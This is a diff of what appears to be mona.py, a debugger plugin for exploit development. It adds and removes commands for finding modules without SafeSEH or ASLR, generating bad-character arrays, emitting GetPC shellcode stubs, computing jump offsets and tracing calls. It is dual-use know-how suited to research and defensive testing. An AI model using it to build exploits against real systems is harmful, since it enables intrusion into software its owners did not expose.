+			modulecriteria["rebase"] = False	
+			dbg.log("Safeseh unprotected, no aslr & no rebase modules :")
+			modulestosearch = getModulesToQuery(modulecriteria)
+			showModuleTable("",modulestosearch)			
+			return
+
+		def procModInfoA(args):
+			modulecriteria = {}
+			criteria = {}
+			modulecriteria["aslr"] = False
+			modulecriteria["rebase"] = False	
+			dbg.log("No aslr & no rebase modules :")			
+			modulestosearch = getModulesToQuery(modulecriteria)
+			showModuleTable("",modulestosearch)			
+			return
+			
+		# ----- Print byte array ----- #
+		
+		def procByteArray(args):
+			badchars = ""
+			bytesperline = 32
+			startval = 0
+			endval = 255
+
+			# kept for legacy
+			if "r" in args:
+				startval = 255
+				endval = 0
+
+			# handle start argument
+			if "s" in args:
+					startval = hex2int(cleanHex(args['s']))
+			# handle end argument
+			if "e" in args:
+					endval = hex2int(cleanHex(args['e']))
+
+			if "b" in args:
+				dbg.log(" *** Note: parameter -b has been deprecated and replaced with -cpb ***")
+				if type(args["b"]).__name__.lower() != "bool":
+					if not "cpb" in args:
+						args["cpb"] = args["b"]
+
+			if "cpb" in args:	
+				badchars = args["cpb"]
+			badchars = cleanHex(badchars)
+
+			# see if we need to expand ..
+			bpos = 0
+			newbadchars = ""
+			while bpos < len(badchars):
+				curchar = badchars[bpos]+badchars[bpos+1]
+				if curchar == "..":
+					pos = bpos
+					if pos > 1 and pos <= len(badchars)-4:
+						# get byte before and after ..
+						bytebefore = badchars[pos-2] + badchars[pos-1]
+						byteafter = badchars[pos+2] + badchars[pos+3]
+						bbefore = int(bytebefore,16)
+						bafter = int(byteafter,16)
+						insertbytes = ""
+						bbefore += 1
+						while bbefore < bafter:
+							insertbytes += "%02x" % bbefore
+							bbefore += 1
+						newbadchars += insertbytes
+				else:
+					newbadchars += curchar
+				bpos += 2
+			badchars = newbadchars
+
+			cnt = 0
+			strb = ""
+			while cnt < len(badchars):
+				strb=strb+binascii.a2b_hex(badchars[cnt]+badchars[cnt+1])
+				cnt=cnt+2
+
+			dbg.log("Generating table, excluding %d bad chars..." % len(strb))
+			arraytable = []
+			binarray = ""
+
+			# handle range() last value
+			if endval > startval:
+				increment = 1
+				endval += 1
+			else:
+				endval += -1
+				increment = -1
+
+			# create bytearray
+			for thisval in range(startval,endval,increment):
+				hexbyte = hex(thisval)[2:]
+				binbyte = hex2bin(toHexByte(thisval))
+				if len(hexbyte) == 1:
+					hexbyte = "0" + hexbyte
+				hexbyte2 = binascii.a2b_hex(hexbyte)
+				if not hexbyte2 in strb:
+					arraytable.append(hexbyte)
+					binarray += binbyte
+
+			dbg.log("Dumping table to file")
+			output = ""
+			cnt = 0
+			outputline = '"'
+			totalbytes = len(arraytable)
+			tablecnt = 0
+			while tablecnt < totalbytes:
+				if (cnt < bytesperline):
+					outputline += "\\x" + arraytable[tablecnt]
+				else:
+					outputline += '"\n'
+					cnt = 0
+					output += outputline
+					outputline = '"\\x' + arraytable[tablecnt]
+				tablecnt += 1
+				cnt += 1
+			if (cnt-1) < bytesperline:
+				outputline += '"\n'
+			output += outputline
+			
+			global ignoremodules
+			ignoremodules = True
+			arrayfilename="bytearray.txt"
+			objarrayfile = MnLog(arrayfilename)
+			arrayfile = objarrayfile.reset()
+			binfilename = arrayfile.replace("bytearray.txt","bytearray.bin")
+			objarrayfile.write(output,arrayfile)
+			ignoremodules = False
+			dbg.logLines(output)
+			dbg.log("")
+			binfile = open(binfilename,"wb")
+			binfile.write(binarray)
+			binfile.close()
+			dbg.log("Done, wrote %d bytes to file %s" % (len(arraytable),arrayfile))
+			dbg.log("Binary output saved in %s" % binfilename)
+			return
+			
+			
+			
+			
+		#----- Read binary file, print 'nice' header -----#
+		def procPrintHeader(args):
+			alltypes = ["ruby","rb","python","py"]
+			thistype = "ruby"
+			filename = ""
+			typewrong = False
+			stopnow = False
+			if "f" in args:
+				if type(args["f"]).__name__.lower() != "bool":	
+					filename = getAbsolutePath(args["f"])
+			if "t" in args:
+				if type(args["t"]).__name__.lower() != "bool":
+					if args["t"] in alltypes:
+						thistype = args["t"]
+					else:
+						typewrong = True
+				else:
+					typewrong = True
+
+			if typewrong:
+				dbg.log("Invalid type specified with option -t. Valid types are: %s" % alltypes,highlight=1)
+				stopnow = True
+			else:
+				if thistype == "rb":
+					thistype = "ruby"
+				if thistype == "py":
+					thistype = "python"
+
+			if filename == "":
+				dbg.log("Missing argument -f <source filename>",highlight=1)
+				stopnow = True
+
+			if stopnow:
+				return
+
+			filename = filename.replace("'","").replace('"',"")
+			content = ""
+			try:		
+				file = open(filename,"rb")
+				content = file.read()
+				file.close()
+			except:
+				dbg.log("Unable to read file %s" % filename,highlight=1)
+				return
+			dbg.log("Read %d bytes from %s" % (len(content),filename))	
+			dbg.log("Output type: %s" % thistype)
+			cnt = 0
+			linecnt = 0	
+			
+			output = ""
+			thisline = ""			
+			
+			max = len(content)
+			
+			addchar = "<<"
+			if thistype == "python":
+				addchar = "+="
+			
+			# keep it easy, initialize header as an empty string
+			output = "header = \"\"\n"
+
+			while cnt < max:
+
+				# first check for unicode
+				if cnt < max-1:
+					
+					thisline = "header %s \"" % addchar	
+					thiscnt = cnt
+					while cnt < max-1 and isAscii2(ord(content[cnt])) and ord(content[cnt+1]) == 0:
+						if content[cnt] == "\\":
+							thisline += "\\"
+						if content[cnt] == "\"":
+							thisline += "\\"
+						thisline += "%s\\x00" % content[cnt]
+						cnt += 2
+					if thiscnt != cnt:
+						output += thisline + "\"" + "\n"
+						linecnt += 1
+						
+				thisline = "header %s \"" % addchar
+				thiscnt = cnt
+				
+				# ascii repetitions
+				reps = 1
+				startval = content[cnt]
+				if isAscii(ord(content[cnt])):
+					while cnt < max-1:
+						if startval == content[cnt+1]:
+							reps += 1
+							cnt += 1	
+						else:
+							break
+					if reps > 1:
+						if startval == "\\":
+							startval += "\\"
+						if startval == "\"":
+							startval = "\\" + "\""	
+						output += thisline + startval + "\" * " + str(reps) + "\n"
+						cnt += 1
+						linecnt += 1
+						continue
+						
+
+				thisline = "header %s \"" % addchar
+				thiscnt = cnt
+				
+				# check for just ascii
+				while cnt < max and isAscii2(ord(content[cnt])):
+					if cnt < max-1 and ord(content[cnt+1]) == 0:
+						break
+					if content[cnt] == "\\":
+						thisline += "\\"
+					if content[cnt] == "\"":
+						thisline += "\\"			
+					thisline += content[cnt]
+					cnt += 1
+					
+					
+				if thiscnt != cnt:
+					output += thisline + "\"" + "\n"
+					linecnt += 1		
+				
+				#check others : repetitions
+				if cnt < max:
+					thisline = "header %s \"" % addchar
+					thiscnt = cnt
+					while cnt < max:
+						if isAscii2(ord(content[cnt])):
+							break
+						if cnt < max-1 and isAscii2(ord(content[cnt])) and ord(content[cnt+1]) == 0:
+							break
+						#check repetitions
+						reps = 1
+						startval = ord(content[cnt])
+						while cnt < max-1:
+							if startval == ord(content[cnt+1]):
+								reps += 1
+								cnt += 1	
+							else:
+								break
+						if reps > 1:
+							if len(thisline) > 12:
+								output += thisline + "\"" + "\n"
+							thisline = "header %s \"\\x" % addchar 
+							thisline += "%02x\" * %d" % (startval,reps)
+							output += thisline + "\n"
+							thisline = "header %s \"" % addchar
+							linecnt += 1
+						else:
+							thisline += "\\x" + "%02x" % ord(content[cnt])	
+						cnt += 1
+					if thiscnt != cnt:
+						if len(thisline) > 12:
+							output += thisline + "\"" + "\n"
+							linecnt += 1			
+
+			global ignoremodules
+			ignoremodules = True
+			headerfilename="header.txt"
+			objheaderfile = MnLog(headerfilename)
+			headerfile = objheaderfile.reset()
+			objheaderfile.write(output,headerfile)
+			ignoremodules = False
+			if not silent:
+				dbg.log("-" * 30)
+				dbg.logLines(output)
+				dbg.log("-" * 30)			
+			dbg.log("Wrote header to %s" % headerfile)
+			return
+		
+		#----- Update -----#
+		
+		def procUpdate(args):
+			"""
+			Function to update mona and optionally windbglib to the latest version
+			
+			Arguments : none
+			
+			Returns : new version of mona/windbglib (if available)
+			"""
+
+			updateproto = "https"
+
+			#debugger version	
+			imversion = __IMM__
+			#url
+			dbg.setStatusBar("Running update process...")
+			dbg.updateLog()
+			updateurl = "https://github.com/corelan/mona/raw/master/mona.py"
+			
+			currentversion,currentrevision = getVersionInfo(inspect.stack()[0][1])
+			u = ""
+			try:
+				u = urllib.urlretrieve(updateurl)
+				newversion,newrevision = getVersionInfo(u[0])
+				if newversion != "" and newrevision != "":
+					dbg.log("[+] Version compare :")
+					dbg.log("    Current Version : %s, Current Revision : %s" % (currentversion,currentrevision))
+					dbg.log("    Latest Version : %s, Latest Revision : %s" % (newversion,newrevision))
+				else:
+					dbg.log("[-] Unable to check latest version (corrupted file ?), try again later",highlight=1)
+					return
+			except:
+				dbg.log("[-] Unable to check latest version (download error). Try again later",highlight=1)
+				dbg.log("    Meanwhile, please check/confirm that you're running a recent version of python 2.7 (2.7.14 or higher)", highlight=1)
+				return
+			#check versions
+			doupdate = False
+			if newversion != "" and newrevision != "":
+				if currentversion != newversion:
+					doupdate = True
+				else:
+					if int(currentrevision) < int(newrevision):
+						doupdate = True
+				
+			if doupdate:
+				dbg.log("[+] New version available",highlight=1)
+				dbg.log("    Updating to %s r%s" % (newversion,newrevision),highlight=1)
+				try:
+					shutil.copyfile(u[0],inspect.stack()[0][1])
+					dbg.log("    Done")					
+				except:
+					dbg.log("    ** Unable to update mona.py",highlight=1)
+				currentversion,currentrevision = getVersionInfo(inspect.stack()[0][1])
+				dbg.log("[+] Current version : %s r%s" % (currentversion,currentrevision))
+			else:
+				dbg.log("[+] You are running the latest version")
+
+			# update windbglib if needed
+			if __DEBUGGERAPP__ == "WinDBG":
+				dbg.log("[+] Locating windbglib path")
+				paths = sys.path
+				filefound = False
+				libfile = ""
+				for ppath in paths:
+					libfile = ppath + "\\windbglib.py"
+					if os.path.isfile(libfile):
+						filefound=True
+						break
+				if not filefound:
+					dbg.log("    ** Unable to find windbglib.py ! **")
+				else:
+					dbg.log("[+] Checking if %s needs an update..." % libfile)
+					updateurl = "https://github.com/corelan/windbglib/raw/master/windbglib.py"
+
+					currentversion,currentrevision = getVersionInfo(libfile)
+					u = ""
+					try:
+						u = urllib.urlretrieve(updateurl)
+						newversion,newrevision = getVersionInfo(u[0])
+						if newversion != "" and newrevision != "":
+							dbg.log("[+] Version compare :")
+							dbg.log("    Current Version : %s, Current Revision : %s" % (currentversion,currentrevision))
+							dbg.log("    Latest Version : %s, Latest Revision : %s" % (newversion,newrevision))
+						else:
+							dbg.log("[-] Unable to check latest version (corrupted file ?), try again later",highlight=1)
+							return
+					except:
+						dbg.log("[-] Unable to check latest version (download error). Try again later",highlight=1)
+						dbg.log("    Meanwhile, please check/confirm that you're running a recent version of python 2.7 (2.7.14 or higher)", highlight=1)
+						return
+
+					#check versions
+					doupdate = False
+					if newversion != "" and newrevision != "":
+						if currentversion != newversion:
+							doupdate = True
+						else:
+							if int(currentrevision) < int(newrevision):
+								doupdate = True
+						
+					if doupdate:
+						dbg.log("[+] New version available",highlight=1)
+						dbg.log("    Updating to %s r%s" % (newversion,newrevision),highlight=1) 
+						try:
+							shutil.copyfile(u[0],libfile)
+							dbg.log("    Done")					
+						except:
+							dbg.log("    ** Unable to update windbglib.py",highlight=1)
+						currentversion,currentrevision = getVersionInfo(libfile)
+						dbg.log("[+] Current version : %s r%s" % (currentversion,currentrevision))
+					else:
+						dbg.log("[+] You are running the latest version")
+
+			dbg.setStatusBar("Done.")
+			return
+			
+		#----- GetPC -----#
+		def procgetPC(args):
+			r32 = ""
+			output = ""
+			if "r" in args:
+				if type(args["r"]).__name__.lower() != "bool":	
+					r32 = args["r"].lower()
+						  
+			if r32 == "" or not "r" in args:
+				dbg.log("Missing argument -r <register>",highlight=1)
+				return
+
+			opcodes = {}
+			opcodes["eax"] = "\\x58"
+			opcodes["ecx"] = "\\x59"
+			opcodes["edx"] = "\\x5a"
+			opcodes["ebx"] = "\\x5b"				
+			opcodes["esp"] = "\\x5c"
+			opcodes["ebp"] = "\\x5d"
+			opcodes["esi"] = "\\x5e"
+			opcodes["edi"] = "\\x5f"
+
+			calls = {}
+			calls["eax"] = "\\xd0"
+			calls["ecx"] = "\\xd1"
+			calls["edx"] = "\\xd2"
+			calls["ebx"] = "\\xd3"				
+			calls["esp"] = "\\xd4"
+			calls["ebp"] = "\\xd5"
+			calls["esi"] = "\\xd6"
+			calls["edi"] = "\\xd7"
+			
+			output  = "\n" + r32 + "|  jmp short back:\n\"\\xeb\\x03" + opcodes[r32] + "\\xff" + calls[r32] + "\\xe8\\xf8\\xff\\xff\\xff\"\n"
+			output += r32 + "|  call + 4:\n\"\\xe8\\xff\\xff\\xff\\xff\\xc3" + opcodes[r32] + "\"\n"
+			output += r32 + "|  fstenv:\n\"\\xd9\\xeb\\x9b\\xd9\\x74\\x24\\xf4" + opcodes[r32] + "\"\n"
                         
-            allpointers = findPatternWild(modulecriteria,criteria,pattern,base,top,patterntype)
-                
-            logfile = MnLog("findwild.txt")
-            thislog = logfile.reset()
-            processResults(allpointers,logfile,thislog)     
-            return
-    
-            
-        # ----- assemble: assemble instructions to opcodes ----- #
-        def procAssemble(args):
-            opcodes = ""
-            encoder = ""
-            
-            if not 's' in args:
-                dbg.log("Mandatory argument -s <opcodes> missing", highlight=1)
-                return
-            opcodes = args['s']
-            
-            if 'e' in args:
-                # TODO: implement encoder support
-                dbg.log("Encoder support not yet implemented", highlight=1)
-                return
-                encoder = args['e'].lowercase()
-                if encoder not in ["ascii"]:
-                    dbg.log("Invalid encoder : %s" % encoder, highlight=1)
-                    return
-            
-            assemble(opcodes,encoder)
-            
-        # ----- info: show information about an address ----- #
-        def procInfo(args):
-            if not "a" in args:
-                dbg.log("Missing mandatory argument -a", highlight=1)
-                return
-            
-            address,addyok = getAddyArg(args["a"])
-            if not addyok:
-                dbg.log("%s is an invalid address" % args["a"], highlight=1)
-                return
-            
-            ptr = MnPointer(address)
-            modname = ptr.belongsTo()
-            modinfo = None
-            if modname != "":
-                modinfo = MnModule(modname)
-            rebase = ""
-            rva=0
-            if modinfo :
-                rva = address - modinfo.moduleBase
-            procFlags(args)
-            dbg.log("")         
-            dbg.log("[+] Information about address 0x%s" % toHex(address))
-            dbg.log("    %s" % ptr.__str__())
-            thepage = dbg.getMemoryPageByAddress(address)
-            dbg.log("    Address is part of page 0x%08x - 0x%08x" % (thepage.getBaseAddress(),thepage.getBaseAddress()+thepage.getSize()))
-            section = ""
-            try:
-                section = thepage.getSection()
-            except:
-                section = ""
-            if section != "":
-                dbg.log("    Section : %s" % section)
-            
-            if ptr.isOnStack():
-                stacks = getStacks()
-                stackref = ""
-                for tid in stacks:
-                    currstack = stacks[tid]
-                    if currstack[0] <= address and address <= currstack[1]:
-                        stackref = " (Thread 0x%08x, Stack Base : 0x%08x, Stack Top : 0x%08x)" % (tid,currstack[0],currstack[1])
-                        break
-                dbg.log("    This address is in a stack segment %s" % stackref)
-            if modinfo:
-                dbg.log("    Address is part of a module:")
-                dbg.log("    %s" % modinfo.__str__())
-                if rva != 0:
-                    dbg.log("    Offset from module base: 0x%x" % rva)
-                    if modinfo:
-                        eatlist = modinfo.getEAT()
-                        if address in eatlist:
-                            dbg.log("    Address is start of function '%s' in %s" % (eatlist[address],modname))
-                        else:
-                            iatlist = modinfo.getIAT()
-                            if address in iatlist:
-                                iatentry = iatlist[address]
-                                dbg.log("    Address is part of IAT, and contains pointer to '%s'" % iatentry)              
-            else:
-                output = ""
-                if ptr.isInHeap():
-                    dbg.log("    This address resides in the heap")
-                    dbg.log("")
-                    ptr.showHeapBlockInfo()
-                else:
-                    dbg.log("    Module: None")                 
-            try:
-                dbg.log("")
-                dbg.log("[+] Disassembly:")
-                op = dbg.disasm(address)
-                opstring=getDisasmInstruction(op)
-                dbg.log("    Instruction at %s : %s" % (toHex(address),opstring))
-            except:
-                pass
-            if __DEBUGGERAPP__ == "WinDBG":
-                dbg.log("")
-                dbg.log("Output of !address 0x%08x:" % address)
-                output = dbg.nativeCommand("!address 0x%08x" % address)
-                dbg.logLines(output)
-            dbg.log("")
-        
-        # ----- dump: Dump some memory to a file ----- #
-        def procDump(args):
-            
-            filename = ""
-            if "f" not in args:
-                dbg.log("Missing mandatory argument -f filename", highlight=1)
-                return
-            filename = args["f"]
-            
-            address = None
-            if "s" not in args:
-                dbg.log("Missing mandatory argument -s address", highlight=1)
-                return
-            startaddress = str(args["s"]).replace("0x","").replace("0X","")
-            if not isAddress(startaddress):
-                dbg.log("You have specified an invalid start address", highlight=1)
-                return
-            address = addrToInt(startaddress)
-            
-            size = 0
-            if "n" in args:
-                size = int(args["n"])
-            elif "e" in args:
-                endaddress = str(args["e"]).replace("0x","").replace("0X","")
-                if not isAddress(endaddress):
-                    dbg.log("You have specified an invalid end address", highlight=1)
-                    return
-                end = addrToInt(endaddress)
-                if end < address:
-                    dbg.log("end address %s is before start address %s" % (args["e"],args["s"]), highlight=1)
-                    return
-                size = end - address
-            else:
-                dbg.log("you need to specify either the size of the copy with -n or the end address with -e ", highlight=1)
-                return
-            
-            dumpMemoryToFile(address,size,filename)
-            
-        # ----- compare : Compare contents of a file with copy in memory, indicate bad chars / corruption ----- #
-        def procCompare(args):
-            startpos = 0
-            filename = ""
-            skipmodules = False
-            findunicode = False
-            allregs = dbg.getRegs()
-            if "f" in args:
-                filename = args["f"].replace('"',"").replace("'","")
-                #see if we can read the file
-                if not os.path.isfile(filename):
-                    dbg.log("Unable to find/read file %s" % filename,highlight=1)
-                    return
-            else:
-                dbg.log("You must specify a valid filename using parameter -f", highlight=1)
-                return
-            if "a" in args:
-                startpos,addyok = getAddyArg(args["a"])
-                if not addyok:
-                    dbg.log("%s is an invalid address" % args["a"], highlight=1)
-                    return
-            if "s" in args:
-                skipmodules = True
-            if "unicode" in args:
-                findunicode = True
-            compareFileWithMemory(filename,startpos,skipmodules,findunicode)
-            
-            
-        # ----- offset: Calculate the offset between two addresses ----- #
-        def procOffset(args):
-            extratext1 = ""
-            extratext2 = ""
-            isReg_a1 = False
-            isReg_a2 = False
-            regs = dbg.getRegs()
-            if "a1" not in args:
-                dbg.log("Missing mandatory argument -a1 <address>", highlight=1)
-                return
-            a1 = args["a1"]
-            if "a2" not in args:
-                dbg.log("Missing mandatory argument -a2 <address>", highlight=1)
-                return      
-            a2 = args["a2"]
-
-
-            a1,addyok = getAddyArg(args["a1"])
-            if not addyok:          
-                dbg.log("0x%08x is not a valid address" % a1, highlight=1)
-                return
-
-            a2,addyok = getAddyArg(args["a2"])
-            if not addyok:          
-                dbg.log("0x%08x is not a valid address" % a2, highlight=1)
-                return
-
-            diff = a2 - a1
-            result=toHex(diff)
-            negjmpbytes = ""
-            if a1 > a2:
-                ndiff = a1 - a2
-                result=toHex(4294967296-ndiff) 
-                negjmpbytes="\\x"+ result[6]+result[7]+"\\x"+result[4]+result[5]+"\\x"+result[2]+result[3]+"\\x"+result[0]+result[1]
-                regaction="sub"
-            dbg.log("Offset from 0x%08x to 0x%08x : %d (0x%s) bytes" % (a1,a2,diff,result)) 
-            if a1 > a2:
-                dbg.log("Negative jmp offset : %s" % negjmpbytes)
-            else:
-                dbg.log("Jmp offset : %s" % negjmpbytes)        
-            return      
-                
-        # ----- bp: Set a breakpoint on read/write/exe access ----- #
-        def procBp(args):
-            isReg_a = False
-            regs = dbg.getRegs()
-            thistype = ""
-            
-            if "a" not in args:
-                dbg.log("Missing mandatory argument -a address", highlight=1)
-                dbg.log("The address can be an absolute address, a register, or a modulename!functionname")
-                return
-            a = str(args["a"])
-
-            for reg in regs:
-                if reg.upper() == a.upper():
-                    a=toHex(regs[reg])                  
-                    isReg_a = True
-                    break
-            a = a.upper().replace("0X","").lower()
-            
-            if not isAddress(str(a)):
-                # maybe it's a modulename!function
-                if str(a).find("!") > -1:
-                    modparts = str(a).split("!")
-                    modname = modparts[0]
-                    if not modname.lower().endswith(".dll"):
-                        modname += ".dll" 
-                    themodule = MnModule(modname)                                           
-                    if themodule != None and len(modparts) > 1:
-                        eatlist = themodule.getEAT()
-                        funcname = modparts[1].lower()
-                        addyfound = False
-                        for eatentry in eatlist:
-                            if eatlist[eatentry].lower() == funcname:
-                                a = "%08x" % (eatentry)
-                                addyfound = True
-                                break
-                        if not addyfound:
-                            # maybe it's just a symbol, try to resolve
-                            if __DEBUGGERAPP__ == "WinDBG":
-                                symboladdress = dbg.resolveSymbol(a)
-                                if symboladdress != "" :
-                                    a = symboladdress
-                                    addyfound = True
-                        if not addyfound:
-                            dbg.log("Please specify a valid address/register/modulename!functionname (-a)", highlight=1)
-                            return                              
-                    else:
-                        dbg.log("Please specify a valid address/register/modulename!functionname (-a)", highlight=1)
-                        return                      
-                else:
-                    dbg.log("Please specify a valid address/register/modulename!functionname (-a)", highlight=1)
-                    return
-            
-            valid_types = ["READ", "WRITE", "SFX", "EXEC"]
-
-            if "t" not in args:
-                dbg.log("Missing mandatory argument -t type", highlight=1)
-                dbg.log("Valid types are: %s" % ", ".join(valid_types))
-                return
-            else:
-                thistype = args["t"].upper()
-                
-            
-            if not thistype in valid_types:
-                dbg.log("Invalid type : %s" % thistype)
-                return
-            
-            if thistype == "EXEC":
-                thistype = "SFX"
-            
-            a = hexStrToInt(a)
-            
-            dbg.setMemBreakpoint(a,thistype[0])
-            dbg.log("Breakpoint set on %s of 0x%s" % (thistype,toHex(a)),highlight=1)
-
-
-        # ----- ct: calltrace ---- #
-        def procCallTrace(args):
-            modulecriteria={}
-            criteria={}
-            criteria["accesslevel"] = "X"
-            modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
-            modulestosearch = getModulesToQuery(modulecriteria)
-            hooks = []
-            rethooks = []
-            showargs = 0
-            hookrets = False
-            if not "m" in args:
-                dbg.log(" ** Please specify what module(s) you want to include in the trace, using argument -m **",highlight=1)
-                return
-            if "a" in args:
-                if args["a"] != "":
-                    try:
-                        showargs = int(args["a"])
-                    except:
-                        showargs = 0
-                        
-            if "r" in args:
-                hookrets = True
-            toignore = []
-            limit_scope = True
-            if not "all" in args:
-                # fill up array
-                toignore.append("PeekMessage")
-                toignore.append("GetParent")
-                toignore.append("GetFocus")
-                toignore.append("EnterCritical")
-                toignore.append("LeaveCritical")
-                toignore.append("GetWindow")
-                toignore.append("CallnextHook")
-                toignore.append("TlsGetValue")
-                toignore.append("DefWindowProc")
-                toignore.append("SetTextColor")
-                toignore.append("DrawText")
-                toignore.append("TranslateAccel")
-                toignore.append("TranslateMessage")
-                toignore.append("DispatchMessage")
-                toignore.append("isChild")
-                toignore.append("GetSysColor")
-                toignore.append("SetBkColor")
-                toignore.append("GetDlgCtrl")
-                toignore.append("CallWindowProc")
-                toignore.append("HideCaret")
-                toignore.append("MessageBeep")
-                toignore.append("SetWindowText")
-                toignore.append("GetDlgItem")
-                toignore.append("SetFocus")
-                toignore.append("SetCursor")
-                toignore.append("LoadCursor")
-                toignore.append("SetEvent")
-                toignore.append("SetDlgItem")
-                toignore.append("SetWindowPos")
-                toignore.append("GetDC")
-                toignore.append("ReleaseDC")
-                toignore.append("GetDeviceCaps")
-                toignore.append("GetClientRect")
-                toignore.append("etLastError")
-            else:
-                limit_scope = False
-            if len( modulestosearch) > 0:
-                dbg.log("[+] Initializing log file")
-                logfile = MnLog("calltrace.txt")
-                thislog = logfile.reset()           
-                dbg.log("[+] Number of CALL arguments to display : %d" % showargs)
-                dbg.log("[+] Finding instructions & placing hooks")
-                for thismod in modulestosearch:
-                    dbg.updateLog()
-                    objMod = dbg.getModule(thismod)
-                    if not objMod.isAnalysed:
-                        dbg.log("    Analysing code...")
-                        objMod.Analyse()
-                    themod = MnModule(thismod)
-                    modcodebase = themod.moduleCodebase
-                    modcodetop = themod.moduleCodetop       
-                    dbg.setStatusBar("Placing hooks in %s..." % thismod)
-                    dbg.log("    * %s (0x%08x - 0x%08x)" % (thismod,modcodebase,modcodetop))
-                    ccnt = 0
-                    rcnt = 0
-                    thisaddr = modcodebase
-                    allfuncs = dbg.getAllFunctions(modcodebase)
-                    for func in allfuncs:
-                        thisaddr = func
-                        thisfunc = dbg.getFunction(thisaddr)
-                        instrcnt = 0
-                        while thisfunc.hasAddress(thisaddr):
-                            try:
-                                if instrcnt == 0:
-                                    thisopcode = dbg.disasm(thisaddr)
-                                else:
-                                    thisopcode = dbg.disasmForward(thisaddr,1)
-                                    thisaddr = thisopcode.getAddress()
-                                instruction = getDisasmInstruction(thisopcode)
-                                if instruction.startswith("CALL "):
-                                    ignore_this_instruction = False
-                                    for ignores in toignore:
-                                        if instruction.lower().find(ignores.lower()) > -1:
-                                            ignore_this_instruction = True
-                                            break
-                                    if not ignore_this_instruction:
-                                        if not thisaddr in hooks:
-                                            hooks.append(thisaddr)
-                                            myhook = MnCallTraceHook(thisaddr,showargs,instruction,thislog)
-                                            myhook.add("HOOK_CT_%s" % thisaddr , thisaddr)
-                                    ccnt += 1
-                                if hookrets and instruction.startswith("RETN"):
-                                    if not thisaddr in rethooks:
-                                        rethooks.append(thisaddr)
-                                        myhook = MnCallTraceHook(thisaddr,showargs,instruction,thislog)
-                                        myhook.add("HOOK_CT_%s" % thisaddr , thisaddr)                                  
-                            except:
-                                #dbg.logLines(traceback.format_exc(),highlight=True)
-                                break
-                            instrcnt += 1
-                dbg.log("[+] Total number of CALL hooks placed : %d" % len(hooks))
-                if hookrets:
-                    dbg.log("[+] Total number of RETN hooks placed : %d" % len(rethooks))
-            else:
-                dbg.log("[!] No modules selected or found",highlight=1)
-            return "Done"
-            
-        # ----- bu: set a deferred breakpoint ---- #
-        def procBu(args):
-            if not "a" in args:
-                dbg.log("No targets defined. (-a)",highlight=1)
-                return
-            else:
-                allargs = args["a"]
-                bpargs = allargs.split(",")
-                breakpoints = {}
-                dbg.log("")
-                dbg.log("Received %d addresses//functions to process" % len(bpargs))
-                # set a breakpoint right away for addresses and functions that are mapped already
-                for tbparg in bpargs:
-                    bparg = tbparg.replace(" ","")
-                    # address or module.function ?
-                    if bparg.find(".") > -1:
-                        functionaddress = dbg.getAddress(bparg)
-                        if functionaddress > 0:
-                            # module.function is already mapped, we can set a bp right away
-                            dbg.setBreakpoint(functionaddress)
-                            breakpoints[bparg] = True
-                            dbg.log("Breakpoint set at 0x%08x (%s), was already mapped" % (functionaddress,bparg), highlight=1)
-                        else:
-                            breakpoints[bparg] = False # no breakpoint set yet
-                    elif bparg.find("+") > -1:
-                        ptrparts = bparg.split("+")
-                        modname = ptrparts[0]
-                        if not modname.lower().endswith(".dll"):
-                            modname += ".dll" 
-                        themodule = getModuleObj(modname)                                               
-                        if themodule != None and len(ptrparts) > 1:
-                            address = themodule.getBase() + int(ptrparts[1],16)
-                            if address > 0:
-                                dbg.log("Breakpoint set at %s (0x%08x), was already mapped" % (bparg,address),highlight=1)
-                                dbg.setBreakpoint(address)
-                                breakpoints[bparg] = True
-                            else:
-                                breakpoints[bparg] = False
-                        else:
-                            breakpoints[bparg] = False
-                    if bparg.find(".") == -1 and bparg.find("+") == -1:
-                        # address, see if it is mapped, by reading one byte from that location
-                        address = -1
-                        try:
-                            address = int(bparg,16)
-                        except:
-                            pass
-                        thispage = dbg.getMemoryPageByAddress(address)
-                        if thispage != None:
-                            dbg.setBreakpoint(address)
-                            dbg.log("Breakpoint set at 0x%08x, was already mapped" % address, highlight=1)
-                            breakpoints[bparg] = True
-                        else:
-                            breakpoints[bparg] = False
-
-                # get the correct addresses to put hook on
-                loadlibraryA = dbg.getAddress("kernel32.LoadLibraryA")
-                loadlibraryW = dbg.getAddress("kernel32.LoadLibraryW")
-
-                if loadlibraryA > 0 and loadlibraryW > 0:
-                
-                    # find end of function for each
-                    endAfound = False
-                    endWfound = False
-                    cnt = 1
-                    while not endAfound:
-                        objInstr = dbg.disasmForward(loadlibraryA, cnt)
-                        strInstr = getDisasmInstruction(objInstr)
-                        if strInstr.startswith("RETN"):
-                            endAfound = True
-                            loadlibraryA = objInstr.getAddress()
-                        cnt += 1
-                    
-                    cnt = 1
-                    while not endWfound:
-                        objInstr = dbg.disasmForward(loadlibraryW, cnt)
-                        strInstr = getDisasmInstruction(objInstr)
-                        if strInstr.startswith("RETN"):
-                            endWfound = True
-                            loadlibraryW = objInstr.getAddress()
-                        cnt += 1    
-                    
-                    # if addresses/functions are left, throw them into their own hooks,
-                    # one for each LoadLibrary type.
-                    hooksplaced = False
-                    for bptarget in breakpoints:
-                        if not breakpoints[bptarget]:
-                            myhookA = MnDeferredHook(loadlibraryA, bptarget)
-                            myhookA.add("HOOK_A_%s" % bptarget, loadlibraryA)
-                            myhookW = MnDeferredHook(loadlibraryW, bptarget)
-                            myhookW.add("HOOK_W_%s" % bptarget, loadlibraryW)
-                            dbg.log("Hooks for %s installed" % bptarget)
-                            hooksplaced = True
-                    if not hooksplaced:
-                        dbg.log("No hooks placed")
-                else:
-                    dbg.log("** Unable to place hooks, make sure kernel32.dll is loaded",highlight=1)
-                return "Done"                           
-            
-        # ----- bf: Set a breakpoint on exported functions of a module ----- #
-        def procBf(args):
-
-            funcfilter = ""
-            
-            mode = ""
-            
-            type = "export"
-            
-            modes = ["add","del","list"]
-            types = ["import","export","iat","eat"]
-            
-            modulecriteria={}
-            criteria={}
-            
-            modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
-        
-            if "s" in args:
-                try:
-                    funcfilter = args["s"].lower()
-                except:
-                    dbg.log("No functions selected. (-s)",highlight=1)
-                    return
-            else:
-                dbg.log("No functions selected. (-s)",highlight=1)
-                return
-                    
-            if "t" in args:
-                try:
-                    mode = args["t"].lower()
-                except:
-                    pass
-
-            if "f" in args:
-                try:
-                    type = args["f"].lower()
-                except:
-                    pass
-
-            if not type in types:
-                dbg.log("No valid function type selected (-f <import|export>)",highlight=1)
-                return
-
-            if not mode in modes or mode=="":
-                dbg.log("No valid action defined. (-t add|del|list)")
-
